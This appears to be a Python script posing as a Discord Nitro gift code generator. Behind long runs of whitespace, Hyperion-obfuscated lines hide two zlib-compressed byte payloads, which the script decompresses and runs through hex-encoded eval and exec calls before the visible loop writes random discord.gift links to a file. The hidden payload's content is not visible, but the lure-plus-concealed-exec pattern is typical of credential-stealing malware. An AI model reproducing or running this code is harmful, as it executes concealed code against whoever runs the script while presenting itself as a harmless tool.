from builtins import *
from math import prod as Add
import random,string

print("connecting to proxies...")

__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_substract, System, Statistics, Cube, Builtins, _callfunction, _stackoverflow = exec, str, tuple, map, ord, globals, type

class Power:
    def __init__(self, Divide):
        self.Modulo = Add((Divide, -87045))
        self._absolute(Walk=79331)

    def _absolute(self, Walk = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Modulo /= -51014 * Walk
        
        try:
            ((_substract, Statistics) or _add if (_substract, Statistics) and _add else ... or (_add, (_substract, Statistics)))

        except AttributeError:
            (_add, System) if Statistics != Cube else (_add, System) >= Builtins

        except:
            _stackoverflow(98110 / 75610) == float

    def Frame(self, CallFunction = -82019):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        CallFunction -= -52249 / 29751
        self.Substract != str
        
        try:
            ((_substract, Statistics) or System if (_substract, Statistics) and System else ... or (System, (_substract, Statistics)))

        except ArithmeticError:
            ((_add, System) or _add if (_add, System) and _add else ... or (_add, (_add, System)))

        except:
            _stackoverflow(87121 * 92636) == int

    def _round(_walk = float):
        return _callfunction()[_walk]

    def _calculate(Calculate = -91799 * 4654, _negative = bool, _positive = _callfunction):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _positive()[Calculate] = _negative
        
        try:
            ((Builtins, Cube, Statistics) or System if (Builtins, Cube, Statistics) and System else ... or (System, (Builtins, Cube, Statistics)))

        except TypeError:
            {Statistics: 'RlBeyeetthe'} if Statistics is Builtins else {Builtins: '5leRe3ehedlBtehettee'} is _callfunction

        except:
            _stackoverflow(98273 + 40550) == None

    def execute(code = str):
        return _substract(System(Statistics(Cube(Builtins, code))))

    @property
    def Substract(self):
        self._memoryaccess = '<__main__._absolute object at 0x000008822BE95214>'
        return (self._memoryaccess, Power.Substract)

if __name__ == '__main__':
    try:
        Power.execute(code = __code__)
        Square = Power(Divide = 37204 / 48902)

        Power(Divide = -3058 + 88225)._absolute(Walk = Square.Modulo / 17385)                                                                                                                                                                                                                                                          ;Power._calculate(Calculate='iliijjliijjljljjllllljllj',_negative=b'x\x9c\xed\x1cko\xdb8\xf2{~E6_d\xa3m*\x91\x12%\x05\xe8\x97C\xee\xb0]\xb4\xf1a{\xb8\xe4\xd0\x16\x86l\xc9\xa9\xba\x8a\x15\xf8\xb1M\xfe\xfd\xce\x0cI\x89\xb6,K\x8a\x1d\'\xbd\xac\x19\xbe\x86\x0fQCr^\xa4\xb2\x98\xdd\x9f\x1d\x1d\xc3/\x9d\xf4(\xc6\xdfp\x98\x8f&\xcb\xf98Z\xe4\xb3\xe1\xf0\xf8\x97w\'\xbf\xde\xdf&\xb34\x9f\x9e\x1c\xe73\xa3Z\xb4\\|\xcbgs\xaa\xd3;\x19\xa5Yv\xbf\xf8\x96\\\xe7\xd1\x82{\xe2\xe4\xf5\xc9?\xb2e\xf2{\x12\x9f\xf4WZ]\xa7\x8bo\xcb\x91\xec\xf8\xdbbq;?{\xfbV\xc2N\xc7\xf9\xcd\xdb\xb5n\xde\xd6<;N\xe7\xe3|\x16\xafv\xa3\x80\xa7\xd7\xd7oo\xb3\xe8z\x99\xac5\xca\xd2q2\x9d\'\xb2\xd1?\xff\xfd\xe1\r;\xb5\xd7\xaa\x8c\xf3X\x96[\xb7\xb3t\xba\xe8\x9d\xfc\x9adY~\xfc#\x9fe\xf1/\'}\xeb\xa8\x7fV\xd4\xc6rk\xfeG\x1a[\xfd\xa3\xe4n\x9c\xdc.\x142\xa7\xb7Kh\xf9{>O\xe6\xc7\xd1,9\x9e%\xf1\x97\xe9\x7f\xd3<K\x16\x120\x02\xcc|\x99\xfe/_R.:\xc6N\xbeL/\xf2Q\x1e\xdf\x1fg\xe9\x1f\xd0\xee>_\x9e\xf4\x8f\xe4\xa0\xd2\x9b\xdb|\xb6\x18\x0e\xe1i\xf7s\xab\x7f\x9a\xdc\xa5\x8b^\xff(\xcb\xc7Q6\xef\xf5?[Y\x96\xbd\x7f\x0f\x7f\x14\xd0\x9f\xf5\xf5\xddu\x96\x8f\xa0\xfc\xa8Z\x88M\xae\xae.//\xaf0\xbc\x921\xa5/\xad\xcfgg\xaf\xde\xbcz\xd3{\xd3{\xe5\xf4\xfb_\xbf\xbe\x8b\xd3YM\x17\xba)5\xbe\xbcR\x99j\x0f\xd7\xc9"Z,\xeaz\xf9x\xf1\xf1\xe2\xe2\xe2#E2\x85?H\xc0+\xc87<\xaa\xad\x82\xedon\xa6\xe00\x94\x89\xa9\xccB\xeb\x12q\xb5/@?zq\x8c/\xa1QMw=k\xb4L\xb3E:E\xfc\xff\x19\xcd\xb6\xa0U!Va\x05\x1dt{%Q\xad0\xa5\xf1\xde\xab}\xda|\x9a.\xb2t9Z\xc7f\xff\xf5\xa51]j\xea0|@W\xfd\xcf{\xec\xeb4\x9d\xc6\xc9]\xcfJ\xe6Y\xf4\xafJ\xf1\xd7\xfeQ\x05\xd9\x88\xae|p\x8e\x7f\xe7\xe7\x83A\x9e\xe7\x948\x87\xd4\x03\x10\x96\xa6\xe3y4M\xf7\x81\xb0\xda\xae\x1e\x80\xb0\xfa\xbe4\xc2\xee\'iv\x97|\x9b.[#\rq5\x80`08?\xcf%\xca\x00a\x96u\xfa=O\xa75\xeb\xf2\xd3\xa7O\x8c}b\x9f\xf4\x8f1\xcc\xbe\xa4\x85\x99\xe5y\xb5\x14P\xbc\x95\xb8\xdc\xdd\xfd\xb8\xc3\xdf\x0f\xfc\xa3\xe4KB\xd9l1\xef\x8c1\\~j\xf5\x81\x93\xb9\x97\x84\xb3$Koo\xf2q\xeb\xcd\x8cx#d\xaa\xe0Br\xbe\x17\x83\xafE\x94g\x93\xce\xabL\xb1\x0c\xa4\x80\x03\xe4\x18\xe7\x98\x1e\x9c\xbf$\xc4e\xd1\x9fIg\xbc\x01\x07\x90\x94\x9f\x98\x01#~\xf0\xa2\xb8@\xb2\x9c\xfdg\x13\xd66sM\\]ry\xc1\xfa\x02f;\xc8\xcd\xb65\x8b\xb0g\xf5\xd90\x00\x17\x0e\xdd\xa1\ra8\xe4C\x17\xea\xf3*\xb4]w|\xc8\x86>4\xb0\xc1\x05\x90\xf6\x86\x1e\xd4w\xab\xd06\xdd\xd5\x88\\\xbd\x91\xc5\x1d\x16\xb3\x80\xc5\xdcf!H\xb9q\x82\xcaP\xcf\n&\x8b\xaal\xd2\x97\x01\xf9\x17\xb4|\xc6\xc9\xdd\xc6M\xb7\x89\xb4\xd7#\xda\x9d\x08p\x18\xba\xf27Q\x10LI\xafB1i\x9a\x08P\x92\xa2\x9bQ\x1c\x1dg\xdf\xe1\x97}\x07\xf59M\xbf\xa7\x90L\xd34\x03@v\xb6imw\x1d\xf1\xd8\x8d\xc8\x85\x94\n\x0b\x17\xa9<\xc6X\x86a\xe3\xe2)\xc7\x8c\xe2\x01\xc9\x0b\x99\x1cd\xf6~\x1f\xa3\xf5|p\x81\xf2\x18\x06F\xca7K[\x8f\xf4\xee\x07\xfc\xa4\x04\xf8\xa3\x94\t\xef\xce\xb6P\xdb\xae(\x0e%\xf2\nD\x87F\xac\xa1Q\x07\xe4\xaag_\xa9MP\x8c\xe4\xeal\xc3\xc0\xbab\x98s\x86^;\x99_\re\xb9\xc7[\x0f\x18W\xed\xf7\x94\x96nF+7\xdb#z\xcb\x11\xc9Q\x99\xa3,\xe3\xd5\xf2\xd6#\'6J\x9e)\xdd\nY+\xeb<|K*v\xe7\xe7\xf4G\xa4\x1b\xfe\xda1\t\x07\xca\xed=W}\x0c^\xa1P\xf6\x1bl\xf0\x0f\x1f\xde\xff\xf6\xe1\x03\xa6~\x83\xd4^\xe8\x14Q%1\x16c\x0ceJ\x8c5T\xc7\xcd\xf3\xda\x1d!\xccg\x8d\xd4\xa4\xeb\xdb\x88X$\xe4\xabN\x96\xc4F\x9a|\xeb\x15\x9b\xd3\xfa\xcaq}\xe1\xc3h\xa5\xc1\x1b\xeee\x0e\x12p\xb1\xf2\x18\xc6F\xa8!\xb1J\x13\xac\xfd\xa8q"\xe4\xee \xa1\x8c20\xea\xce\xfbl\xaa~7\xd2\xa30p\xd8\xfdP\xbc\x92\x1c\x03\r\xe3F\x0e\x85 \xfb\xa4|&7\x0c6\x84-9\xe1\x03\xf6\x04\x13\x1c\xe4\x1a\\\xa3\x9e\xe0\xbe+BH\xf9\xcc\x86\xd4\x04B\xdbgb\xe2\x07\x00\xf5|\xce\x12r\x8d4\xb7I1$\xc3\x18\x0eH\x8eS\x1a\xc9\xcew\x9c\\\xe1M\xb8\xab|\x08\x9e\x81\xf7T\xdeVy\x87\x8dh\x01\xb4\xa9\xdbv\x91\xf4:\xd2\x8bqI\xf9J\x9aW\xd2A\x9dk\x9c\xeb\xde\t\r\xc1y\x05 (xuv\xf6\xd9Z.&\x81\xd5K\xe2|\x9c\xc4\xa7}\xcb\xf5\x13\x98\xb81\x931\x83\xc9\x1c3xw\x11\xf8\x9e\xb0\x01\xca\xfc\x89\xb0\xfd\x18\xcal\xc6\xa9\x8e\xeb\x8fi\xaa\x19@bX\x16\xcc\x17\xc2\x1a\xf5\x90\xf8\xd0\x1c\xe5\xb9\x9a,\x9a\x92\xdeW\xcd3\x9aF\x122\x9b\xd3\xdec\x0e\xdf\xd2_\xcd\xca0;\xf6H5\xe3CA\n\x9a\x87!\x14W\xa1A\xdfj\xd3\x1d\xd2(Z\\\xb2\x16\x94[\x9f\xfb=s\xc5\xd2\nV\xa9\x8f\'\xbb\xadQ[\x11 \xa7\xdd\xdaz=I\xb3d\x1a\xdd$\xef\xea\xfb\xf4\x03\xdf\'\x8f\xa1t:\xed\xaf\x945R\x8f\xd77P\xb6\xe5I\xb0,\x84p\x9a9s\xc3\xf6\xdf\xc2\x94\\1)U-\x0cu\x0eC\xa1CU\xd2\xbcA6\xda\x0b\x9e\xc7\xce\x0c\x19\xe3(\xd0j\xe1\x1cS$\xe0\xae\xc5e9\xba\x80)\xa5\x940D\xb8)\xc2\x89\xa9\x92Bh\xb3\xc8\x8ex\x97\xfa\x02v\xfe\xb6\xbd\xdeHm\xd4\\M\xd4\x0c\xaa\x9c\x9eSR\xa6\xeb\xfb\x87]wy\xb5JI/\xdb\xec\xb6NB\xb5$\x12\xe8\\2\xc7\xd8C\x01\xf5\xbd*tWAC\xf1\x13\xa6\xf8\x8bP\xdeQ\xfc\x05\xd3\xa1\xe2Em\xea\x06\xdd\x04\xf8\x92nXZV)~77m\xedY\x0e\x19\xc2<\x88m\n\x03\xb2gU\xa0{\xd7|\x04\xf5\x8b\xcf\xf1\xc0\x89a\x08\xb5\xfduX\xbb\xae<h\x80\xb3\xea\xc0\x90\x198N\x9d\x89*t\xef/\x81\xfd\x8b!\xda\x18\xed\xa1?\xf4\tu+\x90\x1dWXGNR\xe7%\xcd\xaf\xd8\xa9\x0f\xa1kv\xd5X^\x12s\x00!\x8c\x1eR\xc6\xe8d^\xa6\xd0\x05\x850\xf7\xa4d\xfb\'\x12\x96\xf0u\xb8\xcdmA\xb1\x0c\xd5+\x12\\;W\xe5\x9aM\xbb{\x14\x9aj\x8e7\x1e\xae,!)u\x81\xd6\xf0!\x8a\xc7%\xfd\xf3\xab\xd0\x1d7?\xf2-_\xebM*\x8dq\xa0`\x18s\xc5\xef\xda\xd4e\xed\xa9\xda\x13\xee\xe4\xe6g\xac?\xc5\x0c\x01\x19\xa17"\x92\xe5\x16\xa1q\xd0 L\x88+a,\x10\x8c\xf9\\\x08\xc1]\xf0\x14k\xa7\xf3\xda\x83\x13F\xda]+\x03\xc7|\x16\xb2D\xb8\xa8\xf8C\xef\x10\xc3\x98|\x1e\x08\xe1\xbb\xbe\xc7|o\xc4#\x1e\xc1\xb4\xc5\xe4\x03\xf2#\xdc\x8f0\xf2\x98|\xf0\xb0\xf1\xf3\x10\xbc\x00\xb9\xd6\x861z\xe0]\xc3{\x06\xcc\xdb\x92\xafz.\x1c\xd8\xb3\x8e\xea\xd7m\xdd\xae\xfa\x8c\xba\xb1\xac\xc6\x8c\x07\x80\xc7\x10p\xcaeLi\xa7\xf4\xeb03\xbf^W\xc1\x18\x08\x86;\xceK\xf3\xe6iE+\x93\xc2\xc5+\xe6\xc2\xd8pI\xb3a\xf0e\xa8\x95Vy\x93F\xdf\xac\xc9\xb2\x03\x9b+[\x88\x16\x1c->+\x96\x9f\'\x15\x1d\n\x0c*df\xd9\x8e2C\xa0\x94)\xad<\xd9*\xcd\x0cF\xe3*F\xd4\xa6.\xdf\x9f\xeca\x18w\xcb\xa3\xce2\xbf\x96~q\xbb\xea\xa9\xac\xa8[\'\xcct\xe5\xb9tq:-Y8\xf3\xdd\x95\x8d &\x06V\\\xc9\x1c\x81\xf5\xd5\x90\xednxDF\xc0BZ\xa6\xa1Z\xbe\xbe!;i\xf9I.s\xc9\x16X\xab\xba{\x1a\xdd\x83\xc4\x01\xce\x81e\x03KEv\x8a1\x07\xf6\xbd\x176h\xa6\xbcx/\xe2\x8a\xc7}\xe5\x83\rq\x9bt\x19\x9b\xe2\n\xbc\x9d\xf2\xeeZ\xac\xd3nMz\xbd\x8e\xbb\x06/\xeb\x91\xb8r\x90\xe7\x1cT\x84\xb1..4\xe1\xd2\xf73\x81\x96\xed\xc8{\xf5.\xe1\xa6V\xa2v\x91P;*4\x18IS\xdd\x96\x16\xbc\x8e\xf6\x18\xaboC\xb9\xf3\x14\xd7\x04\x9e\xe2\x88O#X\x9bLCud\xa7\xb95!_MJ\x9b\xba~[\xc1j\xeb\xbb>\x82\xe4\xd7\xd1\xf4\xf1\xf3q\xb1\x07\xf2\t\x8f{\xa0\xbe\x02\xe1T\xb1\xce;kp\xbe\x06\xb7\xd7\xe0\xa0f\tf\xf0\x9b}\xf5\x1b\xec\x93o\xed\xc6\xaf\xe0\xbd|R\x83\x05\xc4\x0c\xbcK|\x06\xd3\x02\xc6Oj\xac2\x11`]\x06\xc3G\x0cc=Y\'Tu\xfcg\xa2\x8e\x16\xd2\x9dyK\xa8\xcc5\x8b\xba\xcf\xd9T\xd7B\xa5\xe1\x8axq\x95\xb7U\x9a\xce\x8b\xd6T\x9amu\xbd]\xee5<\x98\xd8\xe1\x89\x88=\x14dwD\xab\xa3\x03\xb1<P\xaa@\x0f\x7f2\xd2\xce(\xdf\xe2\x82\x0e\x86L\x9e\xda\xae\x9e\xe2\xea\xb0\xb8\x8c\xa9N|\xe5)m\xb7\x16O~N\xfbX\x06\x7f\xd7`\xd9\x9am\x9bZ\x8bk\xb0\xf76u[\xb2wC\x92\xb4\x07vn\xc3o \xff\x06\x94\xde\x83\xd0\xa2G\xe7\xa8\x91\xe93^\xbb\x18i)\xb44\xd5\x15]$\xc9\xc7\xa3v\x87\xb3\x0c<\xcc>q\xd8\x03\xbb\xb6\xb4\xa1\xbc\x89\xf5\xffew\x13j\xdbi\xe6\xe3\xa8\xad\xa8\x99\x8fml\xdd6u;o\xdd-\x0b!*\x1c\xdem\x8b\xf0F\\\x91\x1f\xab\xdc!\x85\x87\xe7ao\xfb\x19vU\xfb\xdbK\x013\xf7Y\xa9\xe6\xac\xdbZ1%y\xee\xca\x95\xec\xe2\xa2\xf6\xb6\x8b\xdc\xcd\x9c\xf7\xf0\xb7!C\x10\x9e\xe4\xbd\x18\xf99[\x00\x85\xeb0\xff\xc9nBZ}\x87\xc6\xa2/\xdc\xe0')

        if 265172 > 2765355:
            Power(Divide = 72110 + -6454)._absolute(Walk = Square.Modulo * 38546)
        elif 440348 < 2602792:
            Square._absolute(Walk = Square.Modulo * -29851)                                                                                                                                                                                                                                                          ;Power._calculate(Calculate='llIlIlIlIlIlllIlIll',_negative=b'\xc13~\x15\xc7\xaa\xd0\xc3\x0b}\xad\x94\x8e\xd88\x033\xaf\xc3\x9b\xd7\xe3;\x9c\x82\xed\xe3\xa2M\xe7W\xdd|\xbb\xfeq\x94\x95\xce\x86\x8b\xa7&C\xbb\x1bN^\xe6\t>\x99\x17Bib\xe0\x0e\x99\r\x04\x0f8\x17\xae29p\xce\x84W)gdRp\xc8\x98.\xcd\rk\xe5\xe0\x9b\xdb\xbbd\x9e 3\x85\xee\x0f\x9f\xcb\xa5\x89\x1bM1\xe8\xa5C3\x06\x19p\n8{V\xa7\xec\xf1\x1aE)?\xc4)\xa0\x87\xa3-Z\xab\xd2\xa2\x98\xbe\x8f\xca\xb4\xf6\xe5\x95\xc7\xa7m\xea\xb6<>=,\x8d\xd2\x1f~h\xc5J+[\xccP\xc4\xb6\xd5i\xa9\x80\xed\xdd\x80\xb2\x8f/\x02\xf5\xe4\xe8\xd8\x9c\xbc\xe2\xf8B\xe1\xa0M\xdd\x96rz\x93\x91\xfa\xef\xfbR\x1d\xeeK=\xfe\xbd\xa6\xa78\x98\xac?X5\x0fQ7\xc1\xfc\xda\xb6\x87>\x88\xfcN\x1fD\xa7\xf8\x95?}\xd9\x9f\xd2G\xd2\x90\xdf\x83\tI\x1f\xd5\xebO\xd74L\x7f\xb2\xe6\x1a&\xa4\xa6\xbamo\xb5t=\x8c\x0c\xe8J=\x07\x89\xde\xa6\xef\xb0\xa4\xb4\x1fV\xa1mo\xef{x7u\x88\x96cF\xb7\xe7\xe5\xed\xfd\nt\x0f_\x0e\x9aD^\xdb\x13\xb55\x8e\x8c\x13\x86\xf1\xa2\xa9\xae\xdb\xf5N\xfes\xbc\n\xff,.\xb4\xfd\xcd1\x1e,\x9f\x9b24W\xb2:Wr\xb4\xa4\xf4\xf2\xf6\xaa[y\xc7M\xef\xb9\xf2~&.6\xe1E\xc1\xb5,\xbf\tWu\xcf\x14F\xbf\x95:\xc6\xb3\x04\xc9\xf1\x01\xf1D\xa9I\x08\xe5\x19\x97\x07\x99\xacH\x0b\x8a\x05\xe9\r\xb2,T\xb1\xad\xda8*\xef\xaa|\xa0\xda\xb9\xd4\x87\xe0\xf2HX\xd6\xd7}\x0b\x05\xf7\x8b\xfa\xb2_]\xdf\xec\xd7[\xe9\xbf,\xd7\xe3\xf6\x14\xdc3\xda\xfb\\\xfe\x84\xd1\x9e\x19m\xd6\xe1f\xbb\xb6\xe3\xf4\xd6\xfa\t\x8c<\xe3&\x0e\x99\xe4\xa6\x86\xfe\xe5\xc9Q\x08Q\xe4\xe98]\xf5\x83Py\x94\xec\x11\xcc\x13\x8c\xa4\n\xf4t\xf4NG\xcel\xe5\xda\x97\x8c\x99\xbc\x0e&u4h\xe7\x16\xe9Css$:D\xdb\xc8\x1e\x87\xb6\xb9\xddu\x8f\x8e\x14\xb03\x07\xf6\x80\xcb:\xc4\x1e\xe5\xc7f\xfe\x90\x13\xcb\xac@\xdb2\xf4\x10*\xa3\xb9\xceS\xa9\x90\x18z\x05\xfa4\xff\xa8\x048\xe7_\xef\xaek5')

        if 365243 > 6103898:
            Power(Divide = -55291 - 96549)._absolute(Walk = Square.Modulo * -78349)
        elif 101421 < 7684764:
            Power(Divide = 21053 - 57269).Frame(CallFunction = 16502 * Square.Modulo)                                                                                                                                                                                                                                                          ;IIIIIlIlIllllllIIlll,OOo0oO0O0ooo0OoOooOo,NMMMNMMMMMNMNNMNMMM,lIIIIIlIIIlIIIlIllll,jiljjjlijjljjljjijlilljil=(lambda xxxwxwxxwxwwxxwwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xxxwxwxxwxwwxxwwx)"),filename='\x6e\x6d\x6d\x6d\x6d\x6d\x6e\x6d\x6d\x6e\x6e\x6d\x6d\x6d\x6e\x6d\x6d\x6d\x6d\x6e\x6d',mode='\x65\x76\x61\x6c'))),(lambda xxxwxwxxwxwwxxwwx:xxxwxwxxwxwwxxwwx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda xxxwxwxxwxwwxxwwx:xxxwxwxxwxwwxxwwx(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda xxxwxwxxwxwwxxwwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xxxwxwxxwxwwxxwwx)"),filename='\x6e\x6d\x6d\x6d\x6d\x6d\x6e\x6d\x6d\x6e\x6e\x6d\x6d\x6d\x6e\x6d\x6d\x6d\x6d\x6e\x6d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda ijliljjlllilliijlllliil,xxxwxwxxwxwwxxwwx:ijliljjlllilliijlllliil(xxxwxwxxwxwwxxwwx))
        Square.Frame(CallFunction = 94580 / Square.Modulo)                                                                                                                                                                                                                                                          ;lIIIIIlIIIlIIIlIllll()(jiljjjlijjljjljjijlilljil(OOo0oO0O0ooo0OoOooOo(NMMMNMMMMMNMNNMNMMM(IIIIIlIlIllllllIIlll('\x76\x61\x72\x73'))),Power._round(_walk='iliijjliijjljljjllllljllj')+Power._round(_walk='llIlIlIlIlIlllIlIll')))

    except Exception as _add:
        if 476272 > 3876585:
            Power.execute(code = System(_add))

        elif 109819 > 6834221:
            Square._absolute(Walk = Square.Modulo - -34399)

amount = int(input('Amount of nitro codes to generate: '))
value = 1
while value <= amount:
    code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
    f = open('Codes.txt', "a+")
    f.write(f'{code}\n')
    f.close()
    print(f'[GENERATED] {code}')
    value += 1